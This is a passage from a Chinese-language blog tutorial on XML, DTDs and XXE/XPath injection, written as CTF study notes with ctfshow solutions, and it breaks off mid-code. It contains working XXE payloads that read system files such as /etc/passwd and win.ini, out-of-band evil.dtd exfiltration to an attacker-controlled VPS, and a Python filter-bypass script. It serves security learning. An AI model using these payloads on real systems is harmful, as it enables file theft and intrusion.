class="hljs-name">note</span>&gt;</span><br></code></pre></td></tr></table></figure><p>XML.dtd</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">to</span> (<span class="hljs-meta-keyword">#PCDATA</span>)&gt;</span><span class="hljs-comment">&lt;!--定义to元素为”#PCDATA”类型--&gt;</span><br><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">from</span> (<span class="hljs-meta-keyword">#PCDATA</span>)&gt;</span><span class="hljs-comment">&lt;!--定义from元素为”#PCDATA”类型--&gt;</span><br><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">head</span> (<span class="hljs-meta-keyword">#PCDATA</span>)&gt;</span><span class="hljs-comment">&lt;!--定义head元素为”#PCDATA”类型--&gt;</span><br><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">body</span> (<span class="hljs-meta-keyword">#PCDATA</span>)&gt;</span><span class="hljs-comment">&lt;!--定义body元素为”#PCDATA”类型--&gt;</span><br></code></pre></td></tr></table></figure><p><strong>PCDATA</strong><br>PCDATA 的意思是被解析的字符数据。PCDATA 是会被解析器解析的文本。这些文本将被解析器检查实体以及标记。文本中的标签会被当作标记来处理，而实体会被展开。<br>被解析的字符数据不应当包含任何<code>&amp;</code>，<code>&lt;</code>，或者<code>&gt;</code>字符，需要用<code>&amp;amp</code> <code>&amp;lt</code> <code>&amp;gt</code>实体来分别替换。<br><strong>CDATA</strong><br>CDATA 意思是字符数据，CDATA 是不会被解析器解析的文本，在这些文本中的标签不会被当作标记来对待，其中的实体也不会被展开。</p><ul><li><input checked="" disabled="" type="checkbox"> 内部引用</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE 根元素 [body]&gt;</span><br></code></pre></td></tr></table></figure><p>即 DTD 在 XML 文件内，如：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?XML version=&quot;1.0&quot;?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">note</span> [&lt;!--定义此文档是 note 类型的文档--&gt;</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">note</span> (<span class="hljs-meta-keyword">to</span>,<span class="hljs-meta-keyword">from</span>,<span class="hljs-meta-keyword">heading</span>,<span class="hljs-meta-keyword">body</span>)&gt;</span>&lt;!--定义note元素有四个元素--&gt;</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">to</span> (<span class="hljs-meta-keyword">#PCDATA</span>)&gt;</span>&lt;!--定义to元素为”#PCDATA”类型--&gt;</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">from</span> (<span class="hljs-meta-keyword">#PCDATA</span>)&gt;</span>&lt;!--定义from元素为”#PCDATA”类型--&gt;</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">head</span> (<span class="hljs-meta-keyword">#PCDATA</span>)&gt;</span>&lt;!--定义head元素为”#PCDATA”类型--&gt;</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">body</span> (<span class="hljs-meta-keyword">#PCDATA</span>)&gt;</span>&lt;!--定义body元素为”#PCDATA”类型--&gt;</span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">note</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">to</span>&gt;</span>Y0u<span class="hljs-tag">&lt;/<span class="hljs-name">to</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">from</span>&gt;</span>@re<span class="hljs-tag">&lt;/<span class="hljs-name">from</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>v3ry<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>g00d!<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">note</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="使用方式"><a href="#使用方式" class="headerlink" title="使用方式"></a>使用方式</h3><p><strong>实体使用方式</strong>：分为内部声明实体和引用外部实体</p><ul><li><input checked="" disabled="" type="checkbox"> 内部实体</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY 实体名称 <span class="hljs-meta-string">&quot;实体的值&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p>示例代码：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?XML version = &quot;1.0&quot; encoding = &quot;utf-8&quot;?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">test</span> [</span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">writer</span> <span class="hljs-meta-string">&quot;Dawn&quot;</span>&gt;</span></span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">copyright</span> <span class="hljs-meta-string">&quot;Copyright W3School.com.cn&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">test</span>&gt;</span><span class="hljs-symbol">&amp;writer;</span>©right;<span class="hljs-tag">&lt;/<span class="hljs-name">test</span>&gt;</span><br></code></pre></td></tr></table></figure><p>DTD 在 XML 文档中</p><ul><li><input checked="" disabled="" type="checkbox"> 外部实体</li></ul><p>外部实体，用来引入外部资源。有<code>SYSTEM</code>和<code>PUBLIC</code>两个关键字，表示实体来自本地计算机还是公共计算机。</p><p>通过引用<code>公用DTD</code></p><ul><li>网络上 DTD 文件</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE 根元素 <span class="hljs-meta-keyword">PUBLIC</span> <span class="hljs-meta-string">&quot;DTD_ID&quot;</span> <span class="hljs-meta-string">&quot;DTD_url&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li>外部 DTD 文件</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE 根元素 <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;DTD本地路径&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p>示例代码：</p><ul><li>网络上的外部 DTD 文件</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?XML version = &quot;1.0&quot; encoding = &quot;utf-8&quot;?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">test</span> [</span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">file</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">copyright</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">author</span>&gt;</span><span class="hljs-symbol">&amp;file;</span>©right;<span class="hljs-tag">&lt;/<span class="hljs-name">author</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li>外部 DTD 文件</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?XML version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">root-element</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;XML.dtd&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">note</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">to</span>&gt;</span>Y0u<span class="hljs-tag">&lt;/<span class="hljs-name">to</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">from</span>&gt;</span>@re<span class="hljs-tag">&lt;/<span class="hljs-name">from</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>v3ry<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>g00d!<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">note</span>&gt;</span><br></code></pre></td></tr></table></figure><p>下面是 XML.dtd</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">to</span> (<span class="hljs-meta-keyword">#PCDATA</span>)&gt;</span><span class="hljs-comment">&lt;!--定义to元素为”#PCDATA”类型--&gt;</span><br><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">from</span> (<span class="hljs-meta-keyword">#PCDATA</span>)&gt;</span><span class="hljs-comment">&lt;!--定义from元素为”#PCDATA”类型--&gt;</span><br><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">head</span> (<span class="hljs-meta-keyword">#PCDATA</span>)&gt;</span><span class="hljs-comment">&lt;!--定义head元素为”#PCDATA”类型--&gt;</span><br><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">body</span> (<span class="hljs-meta-keyword">#PCDATA</span>)&gt;</span><span class="hljs-comment">&lt;!--定义body元素为”#PCDATA”类型--&gt;</span><br></code></pre></td></tr></table></figure><p>外部实体协议支持</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211204212420637.png"></p><h3 id="实体参数"><a href="#实体参数" class="headerlink" title="实体参数"></a>实体参数</h3><ul><li>通用实体</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?XML version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">updateProfile</span> [<span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">file</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;file:///c:/windows/win.ini&quot;</span>&gt;</span> ]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">updateProfile</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">firstname</span>&gt;</span>Joe<span class="hljs-tag">&lt;/<span class="hljs-name">firstname</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">lastname</span>&gt;</span><span class="hljs-symbol">&amp;file;</span><span class="hljs-tag">&lt;/<span class="hljs-name">lastname</span>&gt;</span><br>    ...<br><span class="hljs-tag">&lt;/<span class="hljs-name">updateProfile</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li>参数实体</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">an-element</span> <span class="hljs-meta-string">&quot;&lt;!ELEMENT mytag (subtag)&gt;&quot;</span>&gt;</span><br><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">remote-dtd</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;http://somewhere.example.org/remote.dtd&quot;</span>&gt;</span><br>%an-element; %remote-dtd;<br></code></pre></td></tr></table></figure><blockquote><p>对于参数实体：</p><p>1.使用 <code>% 实体名</code>(<strong>这里面空格不能少</strong>) 在 DTD 中定义，并且<strong>只能在 DTD 中使用 <code>%实体名;</code> 引用</strong> 2.只有在 DTD 文件中，参数实体的声明才能引用其他实体 3.和通用实体一样，参数实体也可以外部引用</p></blockquote><h1 id="XML-注入"><a href="#XML-注入" class="headerlink" title="XML 注入"></a>XML 注入</h1><p>在用户能控制输入时，改变闭合即可注入</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181120002645-e7aed0d2-ec17-1.png"></p><p>通过 XML 注入添加了一个名为 USER2 的管理员账户。<br>XML 注入两大要素：<strong>标签闭合和获取 XML 表结构</strong></p><h1 id="XPath-注入"><a href="#XPath-注入" class="headerlink" title="XPath 注入"></a>XPath 注入</h1><p>XPath 注入攻击是指利用 XPath 解析器的松散输入和容错特性，能够在 URL、表单或其它信息上附带恶意的 XPath 查询代码，以获得权限信息的访问权并更改这些信息。XPath 注入攻击是针对 Web 服务应用新的攻击方法，它允许攻击者在事先不知道 XPath 查询相关知识的情况下，通过 XPath 查询得到一个 XML 文档的完整内容。</p><p>XPath 注入发生在当站点使用用户输入的信息来构造请求以获取 XML 数据。攻击者对站点发送经过特殊构造的信息来探究站点使用的 XML 是如何构造的，从而进一步获取正常途径下无法获取的数据。当 XML 数据被用作账户验证时，攻击者还可以提升他的权限。</p><p>XPath 注入攻击同 SQL 注入攻击类似，但与 SQL 注入相比，XPath 具有的优势：</p><ol><li>广泛性<br>只要是利用 XPath 语法的 Web 应用程序若未对输入的 XPath 查询做严格的处理都会存在 XPath 注入漏洞。而在 SQL 注入攻击过程中根据数据库支持的 SQL 语言不同，注入攻击的实现可能不同。</li><li>危害性大<br>XPath 语言几乎可以没有访问控制限制的引用 XML 文档的所有部分。而在 SQL 注入中，一个“<code>用户</code>”的权限可能被限制到 某一特定的表、列或者查询。<br>XPath 注入攻击可以保证得到完整的 XML 文档，即完整的数据库。只要 Web 服务应用具有基本的安全漏洞，即可构造针对 XPath 应用的自动攻击。</li></ol><p>学习 sql 注入时要学习数据库语言，同样这里要学习 XML 的语言 XPtah</p><p><a href="https://www.freebuf.com/column/211251.html">https://www.freebuf.com/column/211251.html</a></p><p>后续补</p><h1 id="XXE-XML-外部实体注入"><a href="#XXE-XML-外部实体注入" class="headerlink" title="XXE(XML 外部实体注入)"></a>XXE(XML 外部实体注入)</h1><p>通过 XXE 可以实现敏感文件读取，PHP RCE 执行，内网探测(发现主机，扫描端口，内网盲注等)，文件上传，拒绝服务攻击</p><p>实验</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    libxml_disable_entity_loader (<span class="hljs-literal">false</span>);<br>    <span class="hljs-variable">$xmlfile</span> = file_get_contents(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br>    <span class="hljs-variable">$dom</span> = <span class="hljs-keyword">new</span> DOMDocument();<br>    <span class="hljs-variable">$dom</span>-&gt;loadXML(<span class="hljs-variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);<br>    <span class="hljs-variable">$creds</span> = simplexml_import_dom(<span class="hljs-variable">$dom</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$creds</span>;<br></code></pre></td></tr></table></figure><ul><li><code>file_get_contents</code>获取客户端输入内容</li><li><code>new DOMDocument()</code>初始化 XML 解析器</li><li><code>loadXML($xmlfile)</code>加载客户端输入的 XML 内容</li><li><code>simplexml_import_dom($dom)</code>获取 XML 文档节点，如果成功则返回 SimpleXMLElement 对象，如果失败则返回 FALSE。</li></ul><p>引入内部实体：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">xxe</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">file</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;file:///c:/windows/system32/drivers/etc/hosts&quot;</span>&gt;</span>]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">data</span>&gt;</span><span class="hljs-symbol">&amp;file;</span><span class="hljs-tag">&lt;/<span class="hljs-name">data</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211204230757218.png"></p><ul><li>ctfshow373</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br>libxml_disable_entity_loader(<span class="hljs-literal">false</span>);<br><span class="hljs-variable">$xmlfile</span> = file_get_contents(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$xmlfile</span>))&#123;<br>    <span class="hljs-variable">$dom</span> = <span class="hljs-keyword">new</span> DOMDocument();<br>    <span class="hljs-variable">$dom</span>-&gt;loadXML(<span class="hljs-variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);<br>    <span class="hljs-variable">$creds</span> = simplexml_import_dom(<span class="hljs-variable">$dom</span>);<br>    <span class="hljs-variable">$ctfshow</span> = <span class="hljs-variable">$creds</span>-&gt;ctfshow;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$ctfshow</span>;<br>&#125;<br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br></code></pre></td></tr></table></figure><p>获取输入，初始化 XML 解析器，加载客服端输入的 XML 内容，获取到 XML 文档节点，将 dom 节点转换为 SimpleXMLElement 对象即 creds，输出 creds 中的变量 ctfshow</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">xxe</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">xxe</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;file:///flag&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">creds</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">ctfshow</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">ctfshow</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">creds</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li>ctfshow374</li></ul><figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs mojolicious"><span class="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">test</span> [</span></span><br><span class="hljs-meta"><span class="xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">file</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;php://filter/read=convert.base64-encode/resource=/flag&quot;</span>&gt;</span></span></span><br><span class="hljs-meta"><span class="xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">evil</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;http://ip:2333/evil.dtd&quot;</span>&gt;</span></span></span><br><span class="hljs-meta"><span class="xml"></span></span><span class="perl">%evil;</span><span class="xml"><span class="hljs-meta"></span></span><br><span class="hljs-meta"><span class="xml"></span></span><span class="perl">%dtd;</span><span class="xml"><span class="hljs-meta"></span></span><br><span class="hljs-meta"><span class="xml"></span></span><span class="perl">%xxe;</span><br></code></pre></td></tr></table></figure><p>evil.dtd</p><figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mojolicious"><span class="xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">dtd</span> <span class="hljs-meta-string">&quot;&lt;!ENTITY &amp;#x25; xxe SYSTEM &#x27;http://vps:2333/%file;&#x27;&gt; &quot;</span>&gt;</span></span><br><span class="xml"></span><span class="perl">%dtd;</span><span class="xml"></span><br><span class="xml"></span><span class="perl">%xxe;</span><br></code></pre></td></tr></table></figure><blockquote><p>python3 -m http.server 2333</p></blockquote><p>可以公用一个端口，也可以区分开，如下</p><ul><li>ctfshow 375</li></ul><p>在 374 的基础上进行过滤</p><blockquote><p>if(preg_match(‘/&lt;?xml version=”1.0”/‘, $xmlfile)){ die(‘error’); }</p></blockquote><figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs mojolicious"><span class="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">test</span> [</span></span><br><span class="hljs-meta"><span class="xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">file</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;php://filter/read=convert.base64-encode/resource=/flag&quot;</span>&gt;</span></span></span><br><span class="hljs-meta"><span class="xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">evil</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;http://ip:2333/evil.dtd&quot;</span>&gt;</span></span></span><br><span class="hljs-meta"><span class="xml"></span></span><span class="perl">%evil;</span><span class="xml"><span class="hljs-meta"></span></span><br><span class="hljs-meta"><span class="xml"></span></span><span class="perl">%dtd;</span><span class="xml"><span class="hljs-meta"></span></span><br><span class="hljs-meta"><span class="xml"></span></span><span class="perl">%xxe;</span><br></code></pre></td></tr></table></figure><p>evil.dtd</p><figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mojolicious"><span class="xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">dtd</span> <span class="hljs-meta-string">&quot;&lt;!ENTITY &amp;#x25; xxe SYSTEM &#x27;http://vps:1234/%file;&#x27;&gt; &quot;</span>&gt;</span></span><br><span class="xml"></span><span class="perl">%dtd;</span><span class="xml"></span><br><span class="xml"></span><span class="perl">%xxe;</span><br></code></pre></td></tr></table></figure><blockquote><p>python3 -m http.server 2333</p><p>python3 -m http.server 1234</p></blockquote><ul><li>ctfshow 377</li></ul><p>过滤了 http 协议，用 utf16 编码绕过，python 发包</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&#x27;http://d7a2ee70-cbf2-4e93-b189-e52a4c8dfee9.challenge.ctf.show/&#x27;</span><br>payload = <span class="hljs-string">&quot;&quot;&quot;&lt;!DOCTYPE test [</span><br><span class="hljs-string">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/flag&quot;&gt;</span><br><span class="hljs-string">&lt;!ENTITY % aaa SYSTEM &quot;http://ip/evil.dtd&quot;&gt;</span><br><span class="hljs-string">%aaa;</span><br><span class="hljs-string">]&gt;</span><br><span class="hljs-string">&lt;root&gt;123&lt;/root&gt;&quot;&quot;&quot;</span><br>payload = payload.encode(<span class="hljs-string">&#x27;utf-16&#x27;</span>)<br>requests.post(url ,data=payload)<br></code></pre></td></tr></table></figure><p>服务器配置 evil.dtd</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">dtd</span> <span class="hljs-meta-string">&quot;&lt;!ENTITY &amp;#x25; xxe SYSTEM &#x27;http://ip/%file;&#x27;&gt; &quot;</span>&gt;</span><br>%dtd;<br>%xxe;<br></code></pre></td></tr></table></figure><ul><li>ctfshow378</li></ul><p>是 xxe-lab 的 php-xxe</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">xxe</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">file</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;file://flag&quot;</span>&gt;</span>]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><span class="hljs-symbol">&amp;file;</span><span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span><span class="hljs-symbol">&amp;file;</span><span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>当文件内容包含大量<code>&lt; &gt; &amp; &quot;</code>等会出现报错</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">xxe</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">file</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;file:///D:/1.txt&quot;</span>&gt;</span> ]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">creds</span>&gt;</span><span class="hljs-symbol">&amp;file;</span><span class="hljs-tag">&lt;/<span class="hljs-name">creds</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211205152814834.png"></p><ul><li>服务端有回显</li></ul><figure class="highlight django"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs django"><span class="xml"><span class="hljs-meta">&lt;?xml 